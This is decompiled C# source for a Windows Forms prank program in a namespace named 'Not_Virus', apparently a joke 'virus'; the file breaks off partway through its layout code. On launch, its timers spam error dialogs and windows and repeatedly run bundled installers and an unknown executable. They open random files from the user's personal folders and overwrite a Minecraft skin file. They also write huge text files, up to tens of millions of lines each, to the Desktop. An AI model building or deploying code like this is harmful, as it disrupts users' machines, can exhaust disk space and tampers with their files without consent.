using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Not_Virus;

public class Form1 : Form
{
	private Random rnd = new Random();

	private string[] funnyQuotes = new string[289]
	{
		"a", "???", "test", "haha", "www", "question mark", "unfriending", "why rAndom people sign ined \n aaaaaaaaaaaaaaaaaaaaaa", "yay Your IP Hacking", "Why Apple Store7542 password hackinged",
		"cool and good", "everyone", "Who can Use BUP? (By Decree of SimpleFlips) \n Joel (Vinesauce) \n Markass \n Loohoo \n Markass \n Cassie (Half of a BUP per week.) \n Anyone that rents it ($5 per month)", "stonks", "epic", "nice", "cool", "wow", "aaaaaaaaa", "minecarft",
		"Those skinny supercomputers confer.", "ip hackmakenow", "OOF UPLOADED", "Made?", "Cloud is 6.6GB COMPLETED", "what is going on", "ok", "ok defeat time", "Not linear!", "YOU BARELY HACK MARIO",
		"I'm using tilt controls!", "時日月♡", "unfort", "UNBLOBK", "Other lang add and Google play apk upload pls", ":handshake:Deal", "Sticks and stones may break my bones, but words are merely the smallest element of language capable of containing meaning in isolation and as such can never directly produce the four thousand Newtons force per square centimeter required to break bones.", "That's like calling your peanut butter sandwich a not fast airplane.", "Hey, Vsauce! Micheal here.", "And as always, thanks for watching.",
		"Note If the internal function raises an error that can be handled before finishing then it will retry until it succeeds.", "U must copy and paste the ones from Unicode. Thingy", "things cannot stay cool and good forever", "reason : banned servers", "pls link", "you ip hacking web", "thog dont caare", "i mostly played the wii u version", "review = 5.0", "@Deleted User",
		"Apple Store7542荒らしだよ", "ok", "good?", "Fixed an issue that could cause Command Blocks to stop working unexpectedly", "End of Announcement", "coming soon", "That is art", "yay", "hi", "@deatg#4721",
		"cmfxmdjxgjhxvyxbwererewt45l43532", "Stage Select - Mega Man 3", "How do u make a account on Xbox live", "It’s Luigi’s rotation party, and you are not invited.", "Kup teraz!", "if I stop, how can I find an octagon?", "I have the world record on Bowser's Big Bean Burrito", "I hope no one looks at my plans while I'm sleeping.", "You need to wait before using the hero ability again!", "What's the deal with airline food?",
		"I'm a tire!", "to upload your photos and videos, visit upload.theweathernetwork.com", "GEX", "maybe it's the way you're dressed?", "You gotta do what?", "the pizza is aggressive", "why image delete", "Bill directs the 1812 overture.", "actually the crowbar snaps in two.", "Chateau Bowser",
		"nice >:]", "@deatg5 神", "this website is bad. im leaving forever", "no worthier easy", "WELCOME TO NINTENDO HOMEPAGE", "THEDRANK.COM", "POWERFUL WARIO GAME 2004", "the correct answer is…", "TXT: \"Donkey Kong guarding his treasure ches\"", "TEXTUAL INTEGRITY FAILURE DETECTED",
		"WARNING: SYNAX INEGRATION ERROR", "CANNO COMPLEE REQUES", "BUP", "luk a hat", "Stonks", "WELCOME TO THE WARP ZONE", "Welcome to die!", "Dabbing is rated E for everyone!", "Footballers are used to striking - thrown on an Alien is a nice sight", "X Brian Robot    ✓ Steven Velociraptor",
		"Best By 07 SEP 18 043 / 49", "100 perCENT SOUP", "Be careful around the fabric of reality, Garfield.", "Fidget Spinner installed✓", "AND MONSTER ARE NOTHARMONIUS", "I like da bonemeal", "I Have A Dire Need", ">>75481902    Sad", "quiz: error cannot start computer", "<helpers.converters.Pokemon object at 0x7f197a25c370>",
		"ak6n rsw;'a;e]1;''BAia7§4š“èÝÑo¼", "nice", "ok", "wow yes", "epic", "cool", "Minecraft Card Game?", "spong", "I.R.O.N.I.C.", "What do you think of EEK?",
		"Just heat and serve!", "RENT PAID", "Perhaps", "Can you find the paper clip?", "HOW DO I SHOT WEB", "What, you egg? [stabs him]", "It's Joke", "that was GOODE", "Special amiibo card included!", "New Funky Mode!",
		"Featuring Dante from the Devil May Cry Series", "The Game!", "The Movie!", "esophagus", "Unregistered Hypercam 2", "SUPER BROS. 5", "NOT FINLAND", "pneumonoultramicroscophicsilicavolcanoconiosis", "eef freef", "CUT BOAT",
		"*banjo stops*", "sherk", "notification regarding pre hosted conquests", "BONE BLOCK", "moose no toady", "SOUP III", "Deluxe!", "Melee", "Brawl", "Collector's Edition",
		"Ultimate Edition", "Licensed by Nintendo", "pick youre fighter", "Jojo reference", "It's been one of those days.", "victory is yours", "Time remaining: 9e+301", "time remaining: 300", "time remaining: 1", "tenor.gif",
		"SANS WAS IN THE YEARBOOK", "\"Yes.\"", "Parabola Earth", "The Luigi Archives", "Importing…", "achievement unlocked", "to recap:", "Toad in a Boat", "'string'", "BOB ESPONJA",
		"OVER THE OCEAN", "HE COMES", "what did you eat for dinner on 5/14?", "Now entering A: sans", "Do you know where you are?", "Not a virus!", "20 ways to kill Mario just kidding 10 ways to kill mario", "how to get pokeflute in soul silver", "Where's the juice?", "You can now play as Luigi.",
		"In a can!", "directors cut", "For Nintendo 3DS", "OH YEAH MR. KRABS", "If you find toad, email me and i'll give you a secret prize", "The computer is destroyed.", "email gun", "make away the words", "Win Mario's ultimate beach party!", "DRINK!",
		"The Sand: it is too sand", "it's a goddamn wonder bread!", "God is not a fidget spinner", "I forgot the MILK¡", "Super Video CD", "Modulate all eggs?", "Welcome to the New Simple Volume Wizard", "You need a Toad to open this Toad!", "hey have you guys wver played super mario what an awesome game", "we are dead for sure",
		"NOT TODAY", "Where’d my wood go?", "Cereal when no milk", "Lamp oil, rope, bombs? You want it? It’s yours my friend. As long as you have enough Rupees.", "I wonder what’s for dinner…", "DINNER BLASTER", "Only 1 percent can pass 5 stage!", "bgm01", "calm4.ogg", "creative7.ogg",
		"sans", "[please pretend this is the BASS TRACK]", "Please make house.", "door touch to bbbbbbbbb......", "Is it really over?", "Get out.", "Next question.", "Z's", "I do not control the speed at which lobsters die.", "How did this happen?",
		"How did we get here?", "Holy CG, look at the time.", "TREE WENT CRUNCH", "I'm really feeling it!", "That's not a fair question.", "Thank you for purchasing bot of deatg!", "house made", "aaaaaaaaaaaaaaaaaaaaaaaa", "NO bad wards", "yay deatg5 house found",
		"bot of deatg left the game", "Unable to connect to world", "Coming soon", "Coming soon to own on DVD and Video", "YOU ARE THE PRINCE OF TENNIS", "bot of deatg 2: Electric Boogaloo", "bot of deatg 3: the Pre-Sequel", "bot of deatg 4: the Return", "My work here is done.", "EXTREME DESERT BUS",
		"NEVER ORDER SPOOKY SPAGHETTI", "WAIT A MINUTE", "Here it is: My special attack.", "Oh man!", "Ultimate Battle", "Did you see that?", "\ud83c\udd31ANOS", "Deleting server...", "<bot of deatg> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "A wild pokémon has appeared! Guess the pokémon and type ccatch <pokémon> to catch it!",
		"あああああああああああああああああああああああああああああああああああ", "If this bot ain't good enough, i'll erase it.", "It will be here for some additional time.", "Finally! A game system for me!", "Actually the crowbar snaps in two.", "Just kidding!", "I honestly could not understand what you said just now.", "Who wants a bot of deatg at 3 in the morning?", "This is really unfunny. Please remove this bot from the server.", "If i had a dollar for every time someone visited my website, i'd have like, 3 dollars.",
		"(Snow Halation) plays)", "It is time to play Calculator", "", "I'm in space!", "ALL YOUR BASE ARE BELONG TO US", "\"BOT OF DEATG\" POSSESES GREAT RISKS AS WELL AS GREAT POSSIBILITIES.", "I need the hydrocarbons i'm looking for.", "CRC stands for Creamy Rigatoni Carbonara.", "BOT OF DEATG IS GOING TO BRAZIL", "You fool. You blongus. You absolute utter clampongus.",
		"Am I glad he's frozen in there and that we're out here.", "bot of deatg: collectors edition", "Not a virus!", "ALMOND ACTIVATED", "Toad very excited (with his legs showing)", "Definitely no hacking here", "This message is already nothing but a memory.", "Special amiibo card included!", "\"bot of deatg will not be in smash because he would be too OP.\"", "The entire Mega Man 3 soundtrack is a Jojo reference",
		"Not linear!", "$19 deatg.com gift card. And yes, I'm giving it away.", "ARMY SAYS HAS DISC", "I;m thinking about thos Beans", "Pls make bot of deatg", "Sorry has support ended Demfex Music", "Url click to auto Authentication", "Demfex tablet = Great", "VPN Valut:\n-super\n-proxy\n-old mobile hack mode lol"
	};

	private IContainer components = null;

	private Timer timer1;

	private Timer timer2;

	private Timer timer3;

	private Timer timer4;

	private Timer timer5;

	private Timer timer6;

	private Timer timer7;

	private Timer timer8;

	private Timer timer9;

	private Timer timer10;

	private Timer timer11;

	private Timer timer12;

	private Timer timer13;

	private Timer timer14;

	private Timer timer15;

	private Timer timer16;

	private Timer timer17;

	private Timer timer18;

	private Timer timer19;

	private Timer timer20;

	private Timer timer21;

	private Timer timer22;

	private Timer timer23;

	private Timer timer24;

	private Timer timer25;

	private CheckBox checkBox1;

	private DomainUpDown domainUpDown1;

	private DataGridView dataGridView1;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column4;

	private DataGridViewTextBoxColumn Column5;

	private DataGridViewTextBoxColumn Column6;

	private DateTimePicker dateTimePicker1;

	private GroupBox groupBox1;

	private ListBox listBox1;

	private PictureBox pictureBox1;

	private RichTextBox richTextBox1;

	private ProgressBar progressBar1;

	private TrackBar trackBar1;

	private VScrollBar vScrollBar1;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
		BeginVirus();
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	public void BeginVirus()
	{
		timer1.set_Enabled(true);
		timer2.set_Enabled(true);
		timer3.set_Enabled(true);
		timer4.set_Enabled(true);
		timer5.set_Enabled(true);
		timer6.set_Enabled(true);
		timer7.set_Enabled(true);
		timer8.set_Enabled(true);
		timer9.set_Enabled(true);
		timer10.set_Enabled(true);
		timer12.set_Enabled(true);
		timer13.set_Enabled(true);
		timer14.set_Enabled(true);
		timer15.set_Enabled(true);
		timer16.set_Enabled(true);
		timer17.set_Enabled(true);
		timer18.set_Enabled(true);
		timer19.set_Enabled(true);
		timer20.set_Enabled(true);
		timer21.set_Enabled(true);
		timer22.set_Enabled(true);
		timer23.set_Enabled(true);
		timer24.set_Enabled(true);
		timer25.set_Enabled(true);
		timer1.set_Interval(rnd.Next(4000, 50000));
		timer2.set_Interval(rnd.Next(4000, 8000));
		timer3.set_Interval(rnd.Next(30000, 90000));
		timer4.set_Interval(rnd.Next(2000, 30000));
		timer5.set_Interval(rnd.Next(2000, 80000));
		timer6.set_Interval(rnd.Next(2000, 3000));
		timer7.set_Interval(rnd.Next(1, 3));
		timer8.set_Interval(rnd.Next(2000, 10000));
		timer9.set_Interval(rnd.Next(2000, 10000));
		timer10.set_Interval(rnd.Next(2000, 10000));
		timer12.set_Interval(rnd.Next(2000, 50000));
		timer13.set_Interval(rnd.Next(2000, 50000));
		timer14.set_Interval(rnd.Next(2000, 18000));
		timer15.set_Interval(rnd.Next(2000, 15000));
		timer16.set_Interval(rnd.Next(2000, 30000));
		timer17.set_Interval(rnd.Next(2000, 30000));
		timer18.set_Interval(rnd.Next(2000, 50000));
		timer19.set_Interval(rnd.Next(2000, 50000));
		timer20.set_Interval(rnd.Next(2000, 50000));
		timer21.set_Interval(rnd.Next(2000, 10000));
		timer22.set_Interval(rnd.Next(2000, 50000));
		timer23.set_Interval(rnd.Next(2000, 10000));
		timer24.set_Interval(rnd.Next(2000, 10000));
		timer25.set_Interval(rnd.Next(2000, 10000));
		ChangeMCSkin();
		ScrambleIntervals();
	}

	private void ScrambleIntervals()
	{
		timer1.set_Interval(rnd.Next(4000, 30000));
		timer2.set_Interval(rnd.Next(3000, 5000));
		timer3.set_Interval(rnd.Next(5000, 50000));
		timer4.set_Interval(rnd.Next(3000, 30000));
		timer5.set_Interval(rnd.Next(17000, 50000));
		timer6.set_Interval(rnd.Next(4000, 50000));
		timer7.set_Interval(rnd.Next(10000, 50000));
		timer8.set_Interval(rnd.Next(2000, 30000));
		timer9.set_Interval(rnd.Next(2000, 25000));
		timer10.set_Interval(rnd.Next(2000, 60000));
		timer12.set_Interval(rnd.Next(5000, 60000));
		timer13.set_Interval(rnd.Next(3000, 50000));
		timer14.set_Interval(rnd.Next(1000, 30000));
		timer15.set_Interval(rnd.Next(1000, 30000));
		timer16.set_Interval(rnd.Next(2000, 50000));
		timer17.set_Interval(rnd.Next(2000, 50000));
		timer18.set_Interval(rnd.Next(2000, 50000));
		timer19.set_Interval(rnd.Next(2000, 50000));
		timer20.set_Interval(rnd.Next(2000, 50000));
		timer21.set_Interval(rnd.Next(2000, 10000));
		timer22.set_Interval(rnd.Next(10000, 50000));
		timer23.set_Interval(rnd.Next(1000, 5000));
		timer24.set_Interval(rnd.Next(1000, 5000));
		timer25.set_Interval(rnd.Next(2000, 20000));
	}

	private void ChangeMCSkin()
	{
		try
		{
			Process.Start("Rick Astley - Never Gonna Give You Up.mp3");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			string path = "custom.png";
			string path2 = "";
			string text = folderPath + "\\AppData\\Local\\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang";
			string path3 = text + "\\minecraftpe";
			string sourceFileName = Path.Combine(path2, path);
			string destFileName = Path.Combine(path3, path);
			File.Copy(sourceFileName, destFileName, overwrite: true);
		}
		catch
		{
		}
	}

	private void timer25_Tick(object sender, EventArgs e)
	{
		ScrambleIntervals();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		deatgWebsiteForm deatgWebsiteForm2 = new deatgWebsiteForm();
		((Control)deatgWebsiteForm2).Show();
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		//IL_031f: Unknown result type (might be due to invalid IL or missing references)
		string[] array = new string[87]
		{
			"HTTP ERROR 400 (BAD REQUEST)", "You ducked up!", "HTTP ERROR 401 (UNAUTHORIZED)", "HTTP ERROR 403 (FORBIDDEN)", "HTTP ERROR 404 (NOT FOUND)", "HTTP ERROR 500 (INTERNAL SERVER ERROR)", "Can only save WORDS as ASCII", "Can't call other Tool", "Can't make folder as that's an existing filename", "Can't merge list",
			"Can't read file", "Character set reset to <x> to suit <language>", "Concordance file is faulty", "Concordance stop list file not found", "Conversion file not found", "Destination folder not found", "Disk problem: File not saved", "Dispersions go with concordances", "Drive not valid", "Failed to access Internet",
			"Failed to create new folder name", "File access denied", "File contains none of the tags specified", "File not found", "Filenames must differ!", "Full drive:\folder name needed", "function not working properly yet", "INI file not found", "Invalid Concordance file", "Invalid file name",
			"Invalid Keywords Database file", "Invalid Keywords file", "Invalid Wordlist Comparison file", "Invalid Wordlist file", "Joining limit reached: join & try again", "Key words file is faulty", "Keywords Database file is faulty", "Limit of 500 file-based search-words reached", "Links between Tools disrupted", "Match list details not specified",
			"Must be a number", "Network registration running elsewhere or vice-versa", "No access to text file: in use elsewhere?", "No associates found", "No clumps identified", "No clusters found", "No collocates found", "No concordance entries found", "No concordance stop list words", "No deleted lines to Zap",
			"No entries in Keywords Database", "No Key Words found", "No key words to plot", "No keyword stop list words", "No lemma list words", "No match list words", "No room for computed variable", "No statistics available", "No stop list words", "No such file(s) found",
			"No tag list words", "Not a valid number", "No wordlists selected", "Only X% of reference corpus words found", "Original text file needed but not found", "Registration string is not correct", "Registration string must be 20 letters long", "Short of Memory!", "Source Folder file(s) not found", "Stop list file not found",
			"Stop list file not read", "Tag file not found", "Tag list file not read", "This function is not yet ready!", "This is a demo version", "To stop getting this annoying message, Update from Demo in setup.exe", "Too many ignores (50 limit)", "Too many sentences (8000 limit)", "Two files needed", "Truncating at xx words -- tag list file has more!",
			"Unable to merge Keywords Databases", "Why did my search fail?", "Word list file not found", "Wordlist comparison file is faulty", "Word-list file is faulty", "Rgmd failed to read updated resource from the CCR on this node.", "Save a copy of the /var/adm/messages files on all nodes, and of the rgmd core file. Contact your authorized Sun service provider for assistance in diagnosing the problem."
		};
		MessageBox.Show(array[rnd.Next(0, array.Length)]);
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		DemfexLogin demfexLogin = new DemfexLogin();
		((Control)demfexLogin).Show();
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		Balls balls = new Balls();
		((Control)balls).Show();
	}

	private void timer5_Tick(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		if ((int)((CommonDialog)val).ShowDialog() == 1)
		{
			Process process = Process.Start(((FileDialog)val).get_FileName());
			process.WaitForInputIdle();
			while (process.MainWindowHandle == IntPtr.Zero)
			{
				Thread.Sleep(100);
				process.Refresh();
			}
			SetParent(process.MainWindowHandle, ((Control)this).get_Handle());
		}
	}

	private void timer6_Tick(object sender, EventArgs e)
	{
		Process.Start("deatg_pack.mcpack");
	}

	private void timer7_Tick(object sender, EventArgs e)
	{
		Process.Start("Rick Astley - Never Gonna Give You Up.mp3");
	}

	private void timer8_Tick(object sender, EventArgs e)
	{
		deatgVideo deatgVideo2 = new deatgVideo();
		((Control)deatgVideo2).Show();
	}

	private void timer9_Tick(object sender, EventArgs e)
	{
		AppleStoreGrief appleStoreGrief = new AppleStoreGrief();
		((Control)appleStoreGrief).Show();
	}

	private void timer10_Tick(object sender, EventArgs e)
	{
		Process.Start("Firefox Installer.exe");
	}

	private void timer11_Tick(object sender, EventArgs e)
	{
		Process.Start("DiscordSetup.exe");
	}

	private void timer12_Tick(object sender, EventArgs e)
	{
		Process.Start("MinecraftInstaller.msi");
	}

	private void timer13_Tick(object sender, EventArgs e)
	{
		Process.Start("1636 - Pokemon Fire Red (U)(Squirrels).gba");
	}

	private void timer14_Tick(object sender, EventArgs e)
	{
		ImageMove imageMove = new ImageMove();
		((Control)imageMove).Show();
	}

	private void timer15_Tick(object sender, EventArgs e)
	{
		ImageMove2 imageMove = new ImageMove2();
		((Control)imageMove).Show();
	}

	private void timer16_Tick(object sender, EventArgs e)
	{
		ResizingForm resizingForm = new ResizingForm();
		((Control)resizingForm).Show();
	}

	private void timer17_Tick(object sender, EventArgs e)
	{
		Process.Start("AcapellaDownloader.exe");
	}

	private void timer18_Tick(object sender, EventArgs e)
	{
		Process.Start("いろいろなブロックの家.fbx");
	}

	private void timer19_Tick(object sender, EventArgs e)
	{
		Process.Start("code.txt");
	}

	private void timer20_Tick(object sender, EventArgs e)
	{
		try
		{
			Process.Start("_asgaldh.EXE");
		}
		catch
		{
		}
	}

	private void timer21_Tick(object sender, EventArgs e)
	{
		try
		{
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "*.*");
			string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "*.*");
			string[] files3 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), "*.*");
			string[] files4 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.*");
			string[] files5 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), "*.*");
			List<string[]> list = new List<string[]>();
			list.Add(files);
			list.Add(files2);
			list.Add(files3);
			list.Add(files4);
			list.Add(files5);
			int index = rnd.Next(0, list.Count);
			string[] array = list[index];
			int maxValue = list[index].Length;
			string fileName = array[rnd.Next(0, maxValue)];
			try
			{
				Process.Start(fileName);
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private void timer22_Tick(object sender, EventArgs e)
	{
		try
		{
			Process.Start("aero.theme");
		}
		catch
		{
		}
	}

	private void timer23_Tick(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string text = funnyQuotes[rnd.Next(0, funnyQuotes.Length)];
		try
		{
			StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".txt");
			for (int i = 0; i < rnd.Next(700000, 75004035); i++)
			{
				streamWriter.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
			}
		}
		catch
		{
			StreamWriter streamWriter2 = new StreamWriter(folderPath + "\\" + Path.GetRandomFileName() + ".txt");
			for (int j = 0; j < rnd.Next(700000, 75004035); j++)
			{
				streamWriter2.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
			}
		}
	}

	private void timer24_Tick(object sender, EventArgs e)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		try
		{
			for (int i = 0; i < rnd.Next(7, 75); i++)
			{
				Directory.CreateDirectory(folderPath + "\\lol fake virus");
				string text = funnyQuotes[rnd.Next(0, funnyQuotes.Length)];
				StreamWriter streamWriter = new StreamWriter(folderPath + "\\lol fake virus\\" + text + ".txt");
				for (int j = 0; j < rnd.Next(700, 7505); j++)
				{
					streamWriter.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
				}
			}
		}
		catch
		{
			new StreamWriter(folderPath + "\\lol fake virus\\" + Path.GetRandomFileName() + ".txt");
			for (int k = 0; k < rnd.Next(70, 75); k++)
			{
				Directory.CreateDirectory(folderPath + "\\lol fake virus");
				StreamWriter streamWriter2 = new StreamWriter(folderPath + "\\lol fake virus\\" + Path.GetRandomFileName() + ".txt");
				for (int l = 0; l < rnd.Next(700, 7505); l++)
				{
					streamWriter2.WriteLine(funnyQuotes[rnd.Next(0, funnyQuotes.Length)]);
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Expected O, but got Unknown
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Expected O, but got Unknown
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e0: Expected O, but got Unknown
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Expected O, but got Unknown
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f6: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Expected O, but got Unknown
		//IL_020d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Expected O, but got Unknown
		//IL_0218: Unknown result type (might be due to invalid IL or missing references)
		//IL_0222: Expected O, but got Unknown
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		//IL_022d: Expected O, but got Unknown
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_0244: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Expected O, but got Unknown
		//IL_025a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0264: Expected O, but got Unknown
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Expected O, but got Unknown
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_027a: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		timer3 = new Timer(components);
		timer4 = new Timer(components);
		timer5 = new Timer(components);
		timer6 = new Timer(components);
		timer7 = new Timer(components);
		timer8 = new Timer(components);
		timer9 = new Timer(components);
		timer10 = new Timer(components);
		timer11 = new Timer(components);
		timer12 = new Timer(components);
		timer13 = new Timer(components);
		timer14 = new Timer(components);
		timer15 = new Timer(components);
		timer16 = new Timer(components);
		timer17 = new Timer(components);
		timer18 = new Timer(components);
		timer19 = new Timer(components);
		timer20 = new Timer(components);
		timer21 = new Timer(components);
		timer22 = new Timer(components);
		timer23 = new Timer(components);
		timer24 = new Timer(components);
		timer25 = new Timer(components);
		checkBox1 = new CheckBox();
		domainUpDown1 = new DomainUpDown();
		dataGridView1 = new DataGridView();
		Column1 = new DataGridViewTextBoxColumn();
		Column2 = new DataGridViewTextBoxColumn();
		Column3 = new DataGridViewTextBoxColumn();
		Column4 = new DataGridViewTextBoxColumn();
		Column5 = new DataGridViewTextBoxColumn();
		Column6 = new DataGridViewTextBoxColumn();
		dateTimePicker1 = new DateTimePicker();
		groupBox1 = new GroupBox();
		listBox1 = new ListBox();
		pictureBox1 = new PictureBox();
		richTextBox1 = new RichTextBox();
		progressBar1 = new ProgressBar();
		trackBar1 = new TrackBar();
		vScrollBar1 = new VScrollBar();
		button1 = new Button();
		((ISupportInitialize)dataGridView1).BeginInit();
		((Control)groupBox1).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)trackBar1).BeginInit();
		((Control)this).SuspendLayout();
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.add_Tick((EventHandler)timer2_Tick);
		timer3.add_Tick((EventHandler)timer3_Tick);
		timer4.add_Tick((EventHandler)timer4_Tick);
		timer5.add_Tick((EventHandler)timer5_Tick);
		timer6.add_Tick((EventHandler)timer6_Tick);
		timer7.add_Tick((EventHandler)timer7_Tick);
		timer8.add_Tick((EventHandler)timer8_Tick);
		timer9.add_Tick((EventHandler)timer9_Tick);
		timer10.add_Tick((EventHandler)timer10_Tick);
		timer11.add_Tick((EventHandler)timer11_Tick);
		timer12.add_Tick((EventHandler)timer12_Tick);
		timer13.add_Tick((EventHandler)timer13_Tick);
		timer14.add_Tick((EventHandler)timer14_Tick);
		timer15.add_Tick((EventHandler)timer15_Tick);
		timer16.add_Tick((EventHandler)timer16_Tick);
		timer17.add_Tick((EventHandler)timer17_Tick);
		timer18.add_Tick((EventHandler)timer18_Tick);
		timer19.add_Tick((EventHandler)timer19_Tick);
		timer20.add_Tick((EventHandler)timer20_Tick);
		timer21.add_Tick((EventHandler)timer21_Tick);
		timer22.add_Tick((EventHandler)timer22_Tick);
		timer23.add_Tick((EventHandler)timer23_Tick);
		timer24.add_Tick((EventHandler)timer24_Tick);
		timer25.add_Tick((EventHandler)timer25_Tick);
		((Control)checkBox1).set_AutoSize(true);
		((Control)checkBox1).set_Location(new Point(37, 89));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(80, 17));
		((Control)checkBox1).set_TabIndex(0);
		((Control)checkBox1).set_Text("checkBox1");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		((Control)domainUpDown1).set_Location(new Point(49, 182));
		((Control)domainUpDown1).set_Name("domainUpDown1");
		((Control)domainUpDown1).set_Size(new Size(120, 20));
		((Control)domainUpDown1).set_TabIndex(1);
		((Control)domainUpDown1).set_Text("domainUpDown1");
		dataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		dataGridView1.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[6]
		{
			(DataGridViewColumn)Column1,
			(DataGridViewColumn)Column2,
			(DataGridViewColumn)Column3,
			(DataGridViewColumn)Column4,
			(DataGridViewColumn)Column5,
			(DataGridViewColumn)Column6
		});
		((Control)dataGridView1).set_Location(new Point(466, 104));
		((Control)dataGridView1).set_Name("dataGridView1");
